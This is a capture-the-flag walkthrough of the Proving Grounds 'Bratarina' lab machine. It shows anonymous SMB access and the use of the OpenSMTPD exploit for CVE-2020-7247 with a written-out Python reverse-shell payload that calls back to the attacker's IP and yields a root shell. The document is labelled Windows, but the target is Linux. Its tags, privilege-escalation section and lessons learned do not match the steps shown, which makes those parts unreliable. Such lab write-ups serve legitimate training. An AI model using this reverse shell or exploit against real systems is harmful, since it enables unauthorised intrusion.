---
title: "Proving Grounds - Bratarina (Windows)"
date: 2026-02-25
description: "Proving Grounds Bratarina Windows walkthrough covering reconnaissance, initial access, and privilege escalation."
categories: [Proving Grounds, Windows]
tags: [rce, suid, php, privilege-escalation]
mermaid: true
content_lang: en
alt_ja: /posts/pg-bratarina-ja/
---

## Overview

| Field                     | Value |
|---------------------------|-------|
| OS                        | Windows |
| Difficulty                | Not specified |
| Attack Surface            | Web application and exposed network services |
| Primary Entry Vector      | Web RCE (CVE-2020-7247) |
| Privilege Escalation Path | Local enumeration -> misconfiguration abuse -> root |

## Credentials

No credentials obtained.

## Reconnaissance

---
💡 Why this works  
This stage maps the reachable attack surface and identifies where exploitation is most likely to succeed. Accurate service and content discovery reduces blind testing and drives targeted follow-up actions.

## Initial Foothold

---
At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
netexec smb "$ip" --shares
```

```bash
✅[22:03][CPU:4][MEM:51][TUN0:192.168.45.168][/home/n0z0]
🐉 > netexec smb "$ip" --shares
SMB         192.168.205.71  445    BRATARINA        [*] Unix - Samba (name:BRATARINA) (domain:) (signing:False) (SMBv1:True) 
SMB         192.168.205.71  445    BRATARINA        [-] Error enumerating shares: STATUS_USER_SESSION_DELETED
        
```

At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
smbclient "//$ip/backups" -N -m SMB3
```

```bash
✅[22:13][CPU:2][MEM:52][TUN0:192.168.45.168][/home/n0z0]
🐉 > smbclient "//$ip/backups" -N -m SMB3
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jul  6 16:46:41 2020
  ..                                  D        0  Mon Jul  6 16:46:41 2020
  passwd.bak                          N     1747  Mon Jul  6 16:46:41 2020

		10253588 blocks of size 1024. 6338248 blocks available
smb: \> get  passwd.bak
getting file \passwd.bak of size 1747 as passwd.bak (4.9 KiloBytes/sec) (average 4.9 KiloBytes/sec)
smb: \> 
```

At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
cat passwd.bak
```

```bash
✅[22:15][CPU:7][MEM:53][TUN0:192.168.45.168][...me/n0z0/work/pg/Bratarina]
🐉 > cat passwd.bak      
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
neil:x:1000:1000:neil,,,:/home/neil:/bin/bash
_smtpd:x:1001:1001:SMTP Daemon:/var/empty:/sbin/nologin
_smtpq:x:1002:1002:SMTPD Queue:/var/empty:/sbin/nologin
postgres:x:111:116:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
```

At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
nc -vn $ip 25
```

```bash
✅[22:14][CPU:70][MEM:53][TUN0:192.168.45.168][/home/n0z0]
🐉 > nc -vn $ip 25   

(UNKNOWN) [192.168.205.71] 25 (smtp) open
220 bratarina ESMTP OpenSMTPD

```

At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
searchsploit opensmtpd
```

```bash
✅[1:17][CPU:6][MEM:46][TUN0:192.168.45.168][/home/n0z0]
🐉 > searchsploit opensmtpd 
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                        |  Path
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenSMTPD 6.6.1 - Remote Code Execution                                                                                               | linux/remote/47984.py
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

```

At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
searchsploit -m 47984
```

```bash
✅[1:28][CPU:16][MEM:49][TUN0:192.168.45.168][...me/n0z0/work/pg/Bratarina]
🐉 > searchsploit -m 47984 
  Exploit: OpenSMTPD 6.6.1 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/47984
     Path: /usr/share/exploitdb/exploits/linux/remote/47984.py
    Codes: CVE-2020-7247
 Verified: True
File Type: Python script, ASCII text executable
Copied to: /home/n0z0/work/pg/Bratarina/47984.py

```

At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
python3 47984.py $ip 25 'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.45.168\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")"'
```

```bash
✅[1:32][CPU:18][MEM:50][TUN0:192.168.45.168][...me/n0z0/work/pg/Bratarina]
🐉 > python3 47984.py $ip 25 'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.45.168\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")"'
[*] OpenSMTPD detected
[*] Connected, sending payload
[*] Payload sent
[*] Done
```

💡 Why this works  
The initial access step chains discovered weaknesses into executable control over the target. Successful foothold techniques are validated by command execution or interactive shell callbacks.

## Privilege Escalation

---
At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
cat proof.txt
ip a
```

```bash
root@bratarina:~# cat proof.txt
cat proof.txt
ac45d9ed7fdfbfc685cf3d0146c197a4
root@bratarina:~# ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
3: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:ab:ae:c7 brd ff:ff:ff:ff:ff:ff
    inet 192.168.205.71/24 brd 192.168.205.255 scope global ens160
       valid_lft forever preferred_lft forever
root@bratarina:~# 

```

💡 Why this works  
Privilege escalation relies on local misconfigurations, unsafe permissions, and trusted execution paths. Enumerating and abusing these trust boundaries is the fastest route to root-level access.

## Lessons Learned / Key Takeaways

- Validate framework debug mode and error exposure in production-like environments.
- Restrict file permissions on scripts and binaries executed by privileged users or schedulers.
- Harden sudo policies to avoid wildcard command expansion and scriptable privileged tools.
- Treat exposed credentials and environment files as critical secrets.

## References

- CVE-2020-7247: https://nvd.nist.gov/vuln/detail/CVE-2020-7247
- RustScan: https://github.com/RustScan/RustScan
- Nmap: https://nmap.org/
- feroxbuster: https://github.com/epi052/feroxbuster
- Nuclei: https://github.com/projectdiscovery/nuclei
- GTFOBins: https://gtfobins.org/
- HackTricks Privilege Escalation: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html
